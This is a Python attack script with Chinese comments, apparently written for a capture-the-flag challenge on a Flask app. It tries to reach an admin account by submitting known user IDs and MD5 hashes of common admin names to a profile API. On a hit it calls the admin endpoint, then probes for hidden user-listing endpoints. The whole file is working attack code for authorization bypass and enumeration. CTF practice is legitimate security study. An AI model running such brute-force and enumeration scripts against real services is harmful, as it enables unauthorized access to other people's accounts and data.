import requests
import re
import hashlib

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 暴力破解管理员")
print(f"[*] Target: {BASE_URL}")
print()

# 测试1: 用已知的 UID 检查是否在数据库中
print("[*] 测试1: 检查已知的 UID 是否在数据库")

known_uids = [
    ("3553c1effa0b4698895a4874cfbd86d8", "ADMiN"),
    ("eb0ffb79891641d789c50970f64aa263", "aDMin"),
    ("8821f97fff4f407d906b14f3ac855b2d", "testuser"),
]

for uid, name in known_uids:
    profile_resp = session.post(f"{BASE_URL}/api/profile", 
        json={"uid": uid},
        headers={"Content-Type": "application/json"})
    print(f"    [{name}] {uid}")
    print(f"        {profile_resp.status_code}: {profile_resp.text}")

print()

# 测试2: 尝试其他常见 admin UID
print("[*] 测试2: 尝试其他可能的 admin UID")

admin_candidate_uids = [
    hashlib.md5("admin".encode()).hexdigest(),
    hashlib.md5("administrator".encode()).hexdigest(),
    hashlib.md5("root".encode()).hexdigest(),
    hashlib.md5("ADMIN".encode()).hexdigest(),
]

for uid in admin_candidate_uids:
    profile_resp = session.post(f"{BASE_URL}/api/profile", 
        json={"uid": uid},
        headers={"Content-Type": "application/json"})
    print(f"    {uid}: {profile_resp.status_code}")
    if profile_resp.status_code == 200:
        print(f"        [+] 找到用户!")
        print(f"        {profile_resp.text}")
        
        # 检查角色
        if '"role":"admin"' in profile_resp.text or '"admin"' in profile_resp.text:
            print(f"        [!!!] 找到管理员!")
            
            # 访问 /api/admin
            admin_resp = session.post(f"{BASE_URL}/api/admin", 
                json={"uid": uid},
                headers={"Content-Type": "application/json"})
            print(f"        POST /api/admin: {admin_resp.status_code}")
            print(f"        {admin_resp.text}")
            break

print()

# 测试3: 检查数据库中有多少用户
print("[*] 测试3: 尝试获取用户列表")

# 尝试调用可能的 API endpoints
endpoints = [
    "/api/users",
    "/api/admin/users",
    "/api/list",
    "/api/users/list",
]

for endpoint in endpoints:
    resp = session.get(f"{BASE_URL}{endpoint}")
    if resp.status_code != 404:
        print(f"    [+] {endpoint}: {resp.status_code}")
        print(f"    {resp.text[:500]}")
    
    resp = session.post(f"{BASE_URL}{endpoint}")
    if resp.status_code != 404:
        print(f"    [+] POST {endpoint}: {resp.status_code}")
        print(f"    {resp.text[:500]}")

print()

print("[*] 测试完成")
